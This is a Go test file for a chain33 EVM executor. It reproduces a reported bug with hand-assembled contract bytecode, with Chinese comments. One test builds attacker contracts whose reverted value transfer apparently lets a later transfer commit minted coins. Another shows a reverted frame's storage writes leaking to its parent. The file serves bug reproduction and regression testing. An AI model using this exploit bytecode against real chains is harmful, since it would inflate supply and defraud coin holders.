package runtime

// 复现安全报告：回滚子调用的转账留在 coins 缓存里，被同一交易后续转账提交，造成增发。
// 提交态 = 交易前状态 + 回执 KV（GetChangedData），与 execTxOne/ExecKVMemSet 一致。

import (
	"math/big"
	"testing"

	ctypes "github.com/33cn/chain33/types"
	vmcommon "github.com/33cn/plugin/plugin/dapp/evm/executor/vm/common"
	"github.com/stretchr/testify/require"
)

func zeroArgs4() []byte { return []byte{0x60, 0x00, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00} }

// Q：把收到的 value 原样 CALL 回 caller，然后 STOP。
func buildRefundCode() []byte {
	code := zeroArgs4()
	return append(code, 0x34, 0x33, 0x5a, 0xf1, 0x00) // CALLVALUE CALLER GAS CALL STOP
}

// P：无 calldata 则 REVERT；有 calldata 则先把 value 转给 q，再把同额转给 payout。
func buildTrapCode(q, payout vmcommon.Address) []byte {
	code := []byte{0x36, 0x60, 0x09, 0x57, 0x60, 0x00, 0x60, 0x00, 0xfd, 0x5b}
	code = append(code, zeroArgs4()...)
	code = append(code, 0x34, 0x73)
	code = append(code, q.Bytes()...)
	code = append(code, 0x5a, 0xf1, 0x50)
	code = append(code, zeroArgs4()...)
	code = append(code, 0x34, 0x73)
	code = append(code, payout.Bytes()...)
	return append(code, 0x5a, 0xf1, 0x00)
}

func TestRevertedValueTransferMints(t *testing.T) {
	env := newGapEnv(t, nil)
	attacker, p, q, payout := addr(0xa1), addr(0xa2), addr(0xa3), addr(0xa4)
	env.deploy(q, attacker, buildRefundCode())
	env.deploy(p, attacker, buildTrapCode(q, payout))
	const value = 100 * 1e8
	env.fund(attacker, 1000*1e8)

	addrs := []vmcommon.Address{attacker, p, q, payout}
	committed := map[string]int64{}
	var preSum int64
	for _, a := range addrs {
		committed[string(env.coins.AccountKey(a.String()))] = env.balance(a)
		preSum += env.balance(a)
	}

	_, _, _, err := env.evm.Call(AccountRef(attacker), p, []byte{0x01}, 5_000_000, value)
	require.NoError(t, err)

	kvs, _ := env.mdb.GetChangedData(env.mdb.GetLastSnapshot().GetID())
	for _, kv := range kvs {
		if _, ok := committed[string(kv.Key)]; ok {
			var acc ctypes.Account
			require.NoError(t, ctypes.Decode(kv.Value, &acc))
			committed[string(kv.Key)] = acc.Balance
		}
	}
	var postSum int64
	for _, a := range addrs {
		b := committed[string(env.coins.AccountKey(a.String()))]
		t.Logf("%s committed=%d cache=%d", a, b, env.balance(a))
		postSum += b
	}
	require.Equal(t, preSum, postSum, "coin supply changed: minted %d", postSum-preSum)
}

// 同一帧内两次 SSTORE 同一槽位后 REVERT：Snapshot.revert 正序重放 prevalue，
// 槽位停在第一次写入的值而不是原值，父帧能读到被回滚帧写过的数据。
func TestRevertedDoubleSStoreLeaks(t *testing.T) {
	env := newGapEnv(t, nil)
	user, s := addr(0xb1), addr(0xb2)
	code := []byte{0x36, 0x60, 0x19, 0x57, // 有 calldata 跳到内层
		0x60, 0x00, 0x60, 0x00, 0x60, 0x01, 0x60, 0x00, 0x60, 0x00, 0x30, 0x5a, 0xf1, 0x50, // CALL self(1 字节 calldata)
		0x60, 0x00, 0x54, 0x60, 0x01, 0x55, 0x00, // slot1 = slot0
		0x5b, 0x60, 0x01, 0x60, 0x00, 0x55, 0x60, 0x02, 0x60, 0x00, 0x55, 0x60, 0x00, 0x60, 0x00, 0xfd} // slot0=1; slot0=2; REVERT
	env.deploy(s, user, code)
	_, _, _, err := env.evm.Call(AccountRef(user), s, nil, 5_000_000, 0)
	require.NoError(t, err)
	slot0 := env.mdb.GetState(s.String(), vmcommon.Hash{})
	slot1 := env.mdb.GetState(s.String(), vmcommon.BigToHash(new(big.Int).SetInt64(1)))
	t.Logf("slot0=%x slot1=%x", slot0.Big(), slot1.Big())
	require.Equal(t, vmcommon.Hash{}, slot1, "parent frame observed a value written by a reverted frame")
}
